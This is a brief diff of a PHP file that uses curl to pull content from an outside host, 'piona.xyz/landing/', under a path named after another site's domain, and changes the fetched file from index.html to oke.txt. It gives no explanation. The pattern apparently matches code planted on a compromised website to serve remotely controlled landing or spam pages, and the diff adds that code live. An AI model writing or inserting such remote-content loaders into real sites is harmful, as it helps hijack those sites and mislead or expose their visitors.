@@ -2,7 +2,7 @@
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
-$ch = curl_init("https://piona.xyz/landing/journal.yayasansahara.org/index.html");
+$ch = curl_init("https://piona.xyz/landing/journal.yayasansahara.org/oke.txt");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $data = curl_exec($ch);
 curl_close($ch);
